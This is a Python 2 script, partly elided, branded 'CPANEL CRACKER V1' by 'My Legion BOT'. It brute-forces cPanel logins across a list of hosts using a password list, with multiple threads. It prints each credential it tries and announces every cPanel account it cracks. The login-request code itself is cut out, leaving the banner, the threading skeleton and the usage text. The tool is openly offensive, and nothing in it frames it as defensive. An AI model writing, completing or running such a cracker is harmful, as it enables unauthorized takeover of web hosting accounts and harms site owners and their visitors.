#!/usr/bin/python
#./scan.py 100 list.txt passwords.txt
#Edited by MyL3gion
import sys
import Queue
import threading
...
CEND = '\033[0m'
print'''
            \033[33m______  ___            ______________       _____                   _______________________
            \033[0m___   |/  /____  __    ___  /__|__  /______ ___(_)____________      ___  __ )_  __ \__  __/
            \033[31m__  /|_/ /__  / / /    __  / ___/_ <__  __ `/_  /_  __ \_  __ \     __  __  |  / / /_  /
            \033[0m_  /  / / _  /_/ /     _  /______/ /_  /_/ /_  / / /_/ /  / / /     _  /_/ // /_/ /_  /
            \033[35m/_/  /_/  _\__, /      /_____/____/ _\__, / /_/  \____//_/ /_/      /_____/ \____/ /_/
            \033[33m          /____/                    /____/

              \033[31m##########################  \033[33mWelcome to \033[0mMy Legion \033[32mBOT  \033[31m##########################\033[0m

                                             \033[36m CPANEL CRACKER V1\033[0m
...
class brute(threading.Thread):
	...
	def bruter(self,ip,user,passwd):
		...
		try:
			...
			print '\033[31m+ \033[33m==> \033[32mTrying! \033[33m'+ip+':\033[0m'+user+':\033[36m'+passwd
			...
			print "\n\033[32m[+++] \033[36mFound cPanel : \033[32m"+url+",\033[0m"+user+",\033[33m"+passwd
...
def brutemain():
	if len(sys.argv) < 2:
		print "\033[36mUSAGE: \033[32mmain.py 100 list.txt pass.txt\033[0m"
		return False
	...
	try:
		...
		for ip in ips:
			...
			print "\033[32m\n Generating combinations for domain: \033[36m"+str(counter)+" / \033[33m"+str(ips_lungime)
			counter = counter+1
